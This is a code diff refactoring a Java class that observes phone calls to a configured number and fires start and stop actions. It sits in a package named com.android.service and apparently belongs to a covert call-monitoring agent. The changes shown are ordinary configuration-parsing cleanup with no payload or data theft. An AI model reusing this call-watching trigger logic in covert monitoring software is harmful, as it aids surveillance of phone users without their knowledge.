@@ -13,13 +13,14 @@ import java.io.IOException;
 
 import com.android.service.Call;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfigurationException;
 import com.android.service.interfaces.Observer;
 import com.android.service.listener.ListenerCall;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 import com.android.service.util.WChar;
 
-public class EventCall extends EventBase implements Observer<Call> {
+public class EventCall extends BaseEvent implements Observer<Call> {
 	/** The Constant TAG. */
 	private static final String TAG = "EventCall"; //$NON-NLS-1$
 
@@ -38,30 +39,16 @@ public class EventCall extends EventBase implements Observer<Call> {
 	}
 
 	@Override
-	public boolean parse(EventConf event) {
-		super.setEvent(event);
-
-		final byte[] conf = event.getParams();
-
-		final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);
-
+	public boolean parse(EventConf conf) {
 		try {
-			actionOnEnter = event.getAction();
-			actionOnExit = databuffer.readInt();
+			number = conf.getString("number");
 
-			// Estraiamo il numero di telefono
-			byte[] num = new byte[databuffer.readInt()];
-			databuffer.read(num);
-
-			number = WChar.getString(num, true);
-
-			num = null;
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " exitAction: " + actionOnExit + " number: \"") ;//$NON-NLS-1$ //$NON-NLS-2$
+				Check.log(TAG + " exitAction: " + actionOnExit + " number: \"");//$NON-NLS-1$ //$NON-NLS-2$
 			}
-		} catch (final IOException e) {
+		} catch (final ConfigurationException e) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error: params FAILED") ;//$NON-NLS-1$
+				Check.log(TAG + " Error: params FAILED");//$NON-NLS-1$
 			}
 			return false;
 		}
@@ -105,10 +92,10 @@ public class EventCall extends EventBase implements Observer<Call> {
 	}
 
 	public void onEnter() {
-		trigger(actionOnEnter);
+		triggerStartAction();
 	}
 
 	public void onExit() {
-		trigger(actionOnExit);
+		triggerStopAction();
 	}
 }
